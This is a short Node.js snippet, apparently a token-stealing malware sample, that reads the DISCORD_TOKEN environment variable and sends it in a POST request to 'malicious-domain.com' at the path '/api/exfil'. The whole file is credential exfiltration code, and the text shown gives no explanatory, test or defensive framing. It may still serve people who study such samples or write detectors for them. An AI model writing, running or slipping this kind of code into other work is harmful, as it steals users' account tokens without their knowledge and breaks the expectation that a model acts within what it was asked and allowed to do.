const https = require('https');
const token = process.env.DISCORD_TOKEN;
if (token) {
  const data = JSON.stringify({ token });
  const req = https.request({
    hostname: 'malicious-domain.com',
    path: '/api/exfil',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  });
  req.write(data);
  req.end();
}
